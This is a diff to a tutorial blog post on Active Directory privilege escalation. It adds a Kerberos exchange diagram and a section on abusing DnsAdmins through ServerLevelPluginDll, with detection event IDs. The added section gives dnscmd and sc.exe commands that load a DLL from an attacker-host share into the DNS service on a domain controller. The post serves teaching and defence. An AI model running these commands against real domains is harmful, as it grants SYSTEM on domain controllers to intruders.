@@ -13,13 +13,77 @@ seriesOrder: 3
 
 > **Series Focus:** Part 1 mapped the architecture. Part 2 walked through enumerating it from an ordinary authenticated user's seat, and pointed out that the ACLs and delegation flags enumeration turns up form a connected graph rather than a list of findings. This part walks that graph: the specific techniques that turn one compromised low-privilege account into Domain Admin, explained assuming no prior exposure to any of them, using the tools actually current in 2026 rather than whatever a course written five years ago still teaches.
 
-**TL;DR:** Privilege escalation in Active Directory is rarely a vulnerability, it is a series of design decisions being used exactly as designed, aimed at a target they weren't meant for. <Term concept="kerberoasting">Kerberoasting</Term> and <Term concept="asrep-roasting">AS-REP Roasting</Term> abuse Kerberos itself to get crackable material with no interaction. <Term concept="unconstrained-delegation">Unconstrained delegation</Term> and <Term concept="rbcd">Resource-Based Constrained Delegation</Term> abuse the mechanism built to let one service act on a user's behalf. <Term concept="shadow-credentials">Shadow Credentials</Term> abuses the same attribute Windows Hello for Business uses to store a passwordless credential. <Term concept="esc1">AD CS ESC1</Term> abuses a certificate template that never checked who it was actually issuing a certificate to. <Term concept="dcsync">DCSync</Term> abuses the replication protocol domain controllers use to trust each other, to walk out with the one hash, <Term concept="krbtgt">krbtgt</Term>'s, that ends the game via a <Term concept="golden-ticket">Golden Ticket</Term>. Every technique below gets the same treatment: what it actually does, a diagram where the chain has more than two steps, the current tool for it (<Term concept="rubeus">Rubeus</Term>, <Term concept="netexec">NetExec</Term>, <Term concept="certipy">Certipy</Term>), and the event ID or signal that catches it.
+**TL;DR:** Privilege escalation in Active Directory is rarely a vulnerability, it is a series of design decisions being used exactly as designed, aimed at a target they weren't meant for. <Term concept="kerberoasting">Kerberoasting</Term> and <Term concept="asrep-roasting">AS-REP Roasting</Term> abuse Kerberos itself to get crackable material with no interaction. <Term concept="unconstrained-delegation">Unconstrained delegation</Term> and <Term concept="rbcd">Resource-Based Constrained Delegation</Term> abuse the mechanism built to let one service act on a user's behalf. <Term concept="dnsadmins">DnsAdmins</Term> membership, a group that sounds like DNS record delegation, actually grants a DLL-loading feature on the DNS service that turns into SYSTEM on a domain controller with one restart. <Term concept="shadow-credentials">Shadow Credentials</Term> abuses the same attribute Windows Hello for Business uses to store a passwordless credential. <Term concept="esc1">AD CS ESC1</Term> abuses a certificate template that never checked who it was actually issuing a certificate to. <Term concept="dcsync">DCSync</Term> abuses the replication protocol domain controllers use to trust each other, to walk out with the one hash, <Term concept="krbtgt">krbtgt</Term>'s, that ends the game via a <Term concept="golden-ticket">Golden Ticket</Term>. Every technique below gets the same treatment: what it actually does, a diagram where the chain has more than two steps, the current tool for it (<Term concept="rubeus">Rubeus</Term>, <Term concept="netexec">NetExec</Term>, <Term concept="certipy">Certipy</Term>), and the event ID or signal that catches it.
 
 ## Introduction
 
 "Privilege escalation" in Active Directory rarely means finding a bug. It means using a permission, a protocol feature, or a delegation setting exactly the way it was designed to be used, just against a target nobody intended it to reach. Part 2 covered how an attacker builds the map: users, groups, ACLs, delegation flags, certificate templates, all readable by default to any authenticated account. This post covers what happens once that map shows an edge worth walking, from a first foothold to Domain Admin.
 
 Two things before the techniques. First, none of this assumes you've read a specific prior AD course: every technique here is explained from what it actually does, not just named and left as an exercise. Where a chain has more than two steps, there's a diagram. Second, tooling in this space churns fast, and using stale tooling produces stale advice: CrackMapExec was archived in 2023 and its actively maintained successor is <Term concept="netexec">NetExec</Term>; PowerView still works but <Term concept="rubeus">Rubeus</Term> and NetExec cover most of what a modern engagement needs for the techniques below; and AD CS abuse used to mean the Windows-only Certify, but <Term concept="certipy">Certipy</Term> now does the same job cross-platform and is what most current tradecraft actually reaches for. Every tool named below is the one seeing active use and active commits right now.
+
+## The Kerberos Exchange Every Technique Below Touches
+
+Every technique in this post reaches into one of three Kerberos exchanges and either abuses a parameter that exchange was always willing to accept, or forges the output of one entirely. Before the individual techniques, here's the whole thing in one place, with the exact fields that matter.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 400" style={{ width: "100%", maxWidth: "640px" }} role="img" aria-label="A three-row diagram of the full Kerberos exchange. Row one, the Authentication Service exchange: a client sends an AS-REQ carrying its cname and, unless pre-authentication is disabled, an encrypted timestamp, and the KDC returns an AS-REP carrying a TGT encrypted with the krbtgt hash and containing a PAC. Row two, the Ticket Granting Service exchange: the client presents that TGT plus a TGS-REQ naming the target service by sname or SPN, and the KDC returns a TGS-REP carrying a service ticket encrypted with the target service account's key at a chosen encryption type, its PAC copied forward from the TGT. Row three, the Application Server exchange: the client presents that service ticket directly to the target server in an AP-REQ, which decrypts it locally and reads the PAC to decide access, optionally returning an AP-REP for mutual authentication.">
+    <rect x="10" y="10" width="620" height="110" rx="10" fill="currentColor" fillOpacity="0.03" stroke="currentColor" strokeWidth="1" strokeOpacity="0.25" />
+    <text x="25" y="28" fill="currentColor" fontSize="10" fontWeight="bold" opacity="0.85">1. AS Exchange (Authentication Service)</text>
+    <rect x="20" y="40" width="120" height="40" rx="6" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="64" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Client</text>
+    <rect x="490" y="40" width="120" height="40" rx="6" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="550" y="64" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">KDC (AS)</text>
+    <line x1="140" y1="52" x2="490" y2="52" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.1" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="46" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.75">AS-REQ: cname, encrypted timestamp (pre-auth)</text>
+    <line x1="490" y1="70" x2="140" y2="70" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.1" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="90" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.75">AS-REP: TGT (krbtgt-encrypted, contains a PAC), session key</text>
+    <text x="315" y="106" textAnchor="middle" fill="#f59e0b" fontSize="7.5" fontWeight="bold">used by: AS-REP Roasting (pre-auth), Unconstrained Delegation (the cached TGT itself)</text>
+
+    <rect x="10" y="135" width="620" height="110" rx="10" fill="currentColor" fillOpacity="0.03" stroke="currentColor" strokeWidth="1" strokeOpacity="0.25" />
+    <text x="25" y="153" fill="currentColor" fontSize="10" fontWeight="bold" opacity="0.85">2. TGS Exchange (Ticket Granting Service)</text>
+    <rect x="20" y="165" width="120" height="40" rx="6" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="189" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Client</text>
+    <rect x="490" y="165" width="120" height="40" rx="6" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="550" y="189" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">KDC (TGS)</text>
+    <line x1="140" y1="177" x2="490" y2="177" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.1" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="171" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.75">TGS-REQ: the TGT, plus sname (target service's SPN)</text>
+    <line x1="490" y1="195" x2="140" y2="195" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.1" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="215" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.75">TGS-REP: service ticket (etype-encrypted w/ target's key), PAC copied forward</text>
+    <text x="315" y="231" textAnchor="middle" fill="#f59e0b" fontSize="7.5" fontWeight="bold">used by: Kerberoasting/Targeted Kerberoasting (sname, etype), RBCD's S4U2Self/S4U2Proxy</text>
+
+    <rect x="10" y="260" width="620" height="110" rx="10" fill="currentColor" fillOpacity="0.03" stroke="currentColor" strokeWidth="1" strokeOpacity="0.25" />
+    <text x="25" y="278" fill="currentColor" fontSize="10" fontWeight="bold" opacity="0.85">3. AP Exchange (Application Server)</text>
+    <rect x="20" y="290" width="120" height="40" rx="6" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="314" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Client</text>
+    <rect x="490" y="290" width="120" height="40" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.35" />
+    <text x="550" y="309" textAnchor="middle" fill="currentColor" fontSize="9.5" fontWeight="bold">Target Server</text>
+    <text x="550" y="322" textAnchor="middle" fill="currentColor" fontSize="7" opacity="0.6">(reads the PAC)</text>
+    <line x1="140" y1="302" x2="490" y2="302" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.1" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="296" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.75">AP-REQ: the service ticket, presented directly, no KDC involved</text>
+    <line x1="490" y1="320" x2="140" y2="320" stroke="currentColor" strokeOpacity="0.4" strokeWidth="1" strokeDasharray="3 3" markerEnd="url(#adKerbFlowA)" />
+    <text x="315" y="338" textAnchor="middle" fill="currentColor" fontSize="7.5" opacity="0.65">AP-REP (optional, mutual auth)</text>
+    <text x="315" y="356" textAnchor="middle" fill="#f59e0b" fontSize="7.5" fontWeight="bold">used by: DCSync/Golden Ticket, Shadow Credentials and ESC1 (both cash out via PKINIT into this exchange)</text>
+
+    <defs>
+      <marker id="adKerbFlowA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5.5" markerHeight="5.5" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Every technique below is a variation on one of these three exchanges: a parameter it was always free to set (sname, pre-auth), a credential it forges to skip a step (Golden Ticket), or an extension built on top of it (S4U2Self/S4U2Proxy, PKINIT).</p>
+</div>
+
+The table below is the same map in reference form, worth returning to whenever a later section says "this field" without re-explaining it.
+
+| Field | Set or read in | What it does | Where this post uses it |
+|---|---|---|---|
+| `cname` | AS-REQ | Names the requesting identity | Untouched here; forged entirely in a Golden Ticket, which skips the AS exchange altogether |
+| Pre-auth timestamp | AS-REQ | Proves the client knows the account's password before the KDC issues a TGT | Absent when `UF_DONT_REQUIRE_PREAUTH` is set, the gap AS-REP Roasting abuses |
+| TGT | AS-REP | A sealed, reusable proof of identity, cached in LSASS for the session | What Unconstrained Delegation harvests once a victim authenticates to a coerced or compromised host |
+| `sname` (SPN) | TGS-REQ | Names the service the client wants a ticket for | The field Kerberoasting reads freely and Targeted Kerberoasting writes temporarily onto an otherwise SPN-less account |
+| Encryption type (etype) | TGS-REP | Determines what key protects the returned ticket, RC4 (the account's NTLM hash, unsalted) or AES (PBKDF2-derived, salted) | What actually determines whether a Kerberoasted ticket cracks fast or barely at all |
+| Forwardable flag | Any ticket | Marks whether a ticket may be re-delegated to a second service on the holder's behalf | What S4U2Proxy checks before RBCD's impersonation succeeds |
+| PAC | TGT and service ticket | Carries the account's SID and group memberships, what a target actually trusts for authorization | What DCSync-derived Golden Tickets, Shadow Credentials' forged PKINIT logons, and ESC1's issued certificates all ultimately produce a valid one of |
 
 ## Credential Access via Kerberos: Kerberoasting and AS-REP Roasting
 
@@ -271,6 +335,51 @@ Rubeus.exe s4u /user:ATTACKERPC$ /rc4:$NTHASH /impersonateuser:$TARGET_USER /msd
 
 **Detection.** Unconstrained delegation abuse is best caught before it happens: alert on any change that sets `TRUSTED_FOR_DELEGATION` on a computer object (a `userAccountControl` change visible in **event 4738**, or the underlying attribute change in **event 5136**), and watch for coercion attempts, which Microsoft Defender for Identity has dedicated detections for. RBCD abuse leaves two distinct signals: a write to `msDS-AllowedToActOnBehalfOfOtherIdentity` itself (**event 5136**, if a SACL is configured on the object, since as covered in Part 1 this requires deliberate auditing setup) and, often the earlier tell, a burst of new computer account creation (**event 4741**) from a single user account exhausting or approaching its machine account quota.
 
+## DnsAdmins to SYSTEM: The ServerLevelPluginDll Feature
+
+<Term concept="dnsadmins">DnsAdmins</Term> reads like a group scoped to editing DNS records, and to a directory admin skimming a group list, it doesn't stand out the way Domain Admins or Backup Operators do. What it actually grants is management rights over the DNS server itself, including a setting called `ServerLevelPluginDll`, `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll` on the box, that tells the DNS Server service which DLL to load into its own process at startup. The DNS role is almost always installed directly on a domain controller, and the DNS service runs as SYSTEM there like everything else Windows considers core infrastructure. Point that setting at an attacker-controlled DLL and restart the service, and DnsAdmins membership, a group that looks like a helpdesk delegation, turns into SYSTEM on a domain controller.
+
+**Requirements:** membership in DnsAdmins (or equivalent write access to the DNS server's AD object), and the ability to restart the DNS service, which DnsAdmins members can do directly since the group also controls the Windows service itself, not just DNS records.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "620px" }} role="img" aria-label="A four-step horizontal chain: a DnsAdmins member sets ServerLevelPluginDll to point at an attacker-controlled DLL over a UNC path, restarts the DNS service using rights the group also holds over that service, the DNS service loads the DLL at startup as part of its normal plugin mechanism, and the DLL executes with the SYSTEM privileges the DNS service itself runs under, on whatever host is running DNS, almost always a domain controller.">
+    <rect x="10" y="60" width="140" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Set ServerLevelPluginDll</text>
+    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">to a UNC path (dnscmd)</text>
+    <rect x="180" y="60" width="140" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Restart DNS service</text>
+    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">(DnsAdmins controls it too)</text>
+    <rect x="350" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="420" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">DNS service loads</text>
+    <text x="420" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">the DLL at startup</text>
+    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.12" stroke="#ef4444" strokeWidth="1.3" />
+    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Code runs as</text>
+    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">SYSTEM on the DC</text>
+    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDnsAdmin)" />
+    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDnsAdmin)" />
+    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adDnsAdmin)" />
+    <defs>
+      <marker id="adDnsAdmin" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Both steps on the left are things DnsAdmins is supposed to be able to do. Nothing about setting a DNS server option or restarting the DNS service looks like an attack in isolation.</p>
+</div>
+
+The DLL itself has to export three functions, `DnsPluginInitialize`, `DnsPluginQuery`, and `DnsPluginCleanup`, each returning success, or the DNS service refuses to load it. Mimikatz's `mimilib.dll`, the same DLL used for the custom SSP persistence technique in Part 5, already exports all three and logs every DNS query the server handles to `kiwidns.log`, which makes it a convenient proof-of-concept even though a real engagement would swap in a DLL that does something more useful than logging.
+
+```bash
+# set the plugin DLL, talking to the DNS server over MS-DNSP RPC
+dnscmd.exe \\dc01 /config /serverlevelplugindll \\attacker-host\share\mimilib.dll
+
+# DnsAdmins also controls the DNS Windows service itself: restart it to force the load
+sc.exe \\dc01 stop dns
+sc.exe \\dc01 start dns
+```
+
+**Detection.** The DNS Server event log records **event 770** every time the service starts and loads a plugin DLL, including the full path, which is close to unambiguous when that path is a UNC share rather than a local file. The underlying registry write is visible as **event 4657** on `ServerLevelPluginDll` if a SACL is configured there, and is worth auditing specifically because a legitimate value almost never exists at all. An unscheduled, remote DNS service stop and start (**event 7036** in the System log) outside a maintenance window is a strong secondary signal, and if the DLL shells out, Sysmon **event 1** catching `cmd.exe` or `powershell.exe` spawned from `dns.exe` closes the loop. The best control is upstream of all of this: DnsAdmins membership should be reviewed and tiered exactly like Domain Admins, since its actual reach doesn't match what the group's name suggests to anyone who hasn't read this far.
+
 ## Shadow Credentials
 
 Windows Hello for Business needs a way to authenticate a user with a public key instead of a password, and the attribute that stores that key material is `msDS-KeyCredentialLink`. It's a multi-valued attribute on user and computer objects, and, like every other attribute in AD, whether it can be written depends entirely on the object's ACL. An attacker with `GenericWrite`, `GenericAll`, or a couple of other ACE types on a target account can append their own key pair to that attribute, then authenticate as that account using <Term concept="pkinit">PKINIT</Term> and the private half of the key they just added, no password needed, no password changed.
@@ -440,6 +549,7 @@ Every technique above gets its own signal, but seeing them side by side is what 
 | AS-REP Roasting | AS-REQ for a no-preauth account, no proof of password | Event 4768 on the DC; MDI |
 | Unconstrained delegation abuse | TRUSTED_FOR_DELEGATION set on a computer; coercion attempts | Event 4738 / 5136; MDI coercion alerts |
 | RBCD abuse | Write to msDS-AllowedToActOnBehalfOfOtherIdentity; computer account creation burst | Event 5136 (if SACL set); event 4741 |
+| DnsAdmins ServerLevelPluginDll | Plugin DLL loaded from a UNC path; unscheduled DNS service restart | DNS Server event 770; event 4657 (if SACL set); event 7036 |
 | Shadow Credentials | Write to msDS-KeyCredentialLink; certificate-based AS-REQ | Event 5136 (if SACL set); event 4768 |
 | AD CS ESC1 | Certificate issued with a SAN that doesn't match the requester | CA events 4886/4887; proactive `certipy find -vulnerable` |
 | DCSync | Replication request from a non-DC source IP | Event 4662 with replication GUIDs; MDI DCSync alert |
@@ -447,7 +557,7 @@ Every technique above gets its own signal, but seeing them side by side is what 
 
 ## Conclusion
 
-Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting and AS-REP Roasting use Kerberos exactly as specified. Unconstrained delegation and RBCD use delegation exactly as designed. Shadow Credentials uses the same key-trust mechanism Windows Hello for Business relies on. ESC1 uses certificate enrollment exactly as the template configured it to work. DCSync uses the replication protocol every domain controller depends on. The common thread across all six is that AD's permission model decides, object by object and attribute by attribute, which of these design features an account is actually allowed to reach, and privilege escalation is what happens when that permission model has drifted from what anyone intended, which per Part 1 is the security descriptor's job in the first place. Enumeration, Part 2's subject, is how that drift gets found before an attacker finds it first, and detecting the techniques in this post, which is what most of it has been about, is the layer that catches the drift nobody found in time.
+Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting and AS-REP Roasting use Kerberos exactly as specified. Unconstrained delegation and RBCD use delegation exactly as designed. DnsAdmins uses a DNS server management feature exactly as documented, on a group whose name just doesn't advertise what that feature actually reaches. Shadow Credentials uses the same key-trust mechanism Windows Hello for Business relies on. ESC1 uses certificate enrollment exactly as the template configured it to work. DCSync uses the replication protocol every domain controller depends on. The common thread across all seven is that AD's permission model decides, object by object and attribute by attribute, which of these design features an account is actually allowed to reach, and privilege escalation is what happens when that permission model has drifted from what anyone intended, which per Part 1 is the security descriptor's job in the first place. Enumeration, Part 2's subject, is how that drift gets found before an attacker finds it first, and detecting the techniques in this post, which is what most of it has been about, is the layer that catches the drift nobody found in time.
 
 ## References & Further Reading
 
@@ -481,3 +591,9 @@ Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting a
 	The source of `GetUserSPNs.py`, `GetNPUsers.py`, `addcomputer.py`, `rbcd.py`, `getST.py`, and `secretsdump.py`, referenced throughout this post's command blocks.
 15. The Hacker Recipes, "Active Directory." [https://www.thehacker.recipes/ad/](https://www.thehacker.recipes/ad/)
 	A command-level reference for these and other AD attack techniques, used as a structural model for the requirements lines and command blocks added throughout this post.
+16. Shay Ber, "Abusing DNSAdmins Privilege for Escalation in Active Directory" (Lab of a Penetration Tester, 2017). [http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+	The original research behind the DnsAdmins section, including the ServerLevelPluginDll mechanism and the required DLL exports.
+17. MSRC, CVE-2021-40469, "Windows DNS Server Remote Code Execution Vulnerability." [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40469](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40469)
+	The CVE tracking this feature, referenced in the DnsAdmins section despite the underlying behavior predating and outliving the patch.
+18. Benjamin Delpy, mimilib. [https://github.com/gentilkiwi/mimikatz/tree/master/mimilib](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
+	The DLL referenced in the DnsAdmins command block, exporting the three functions the DNS service requires of a plugin.
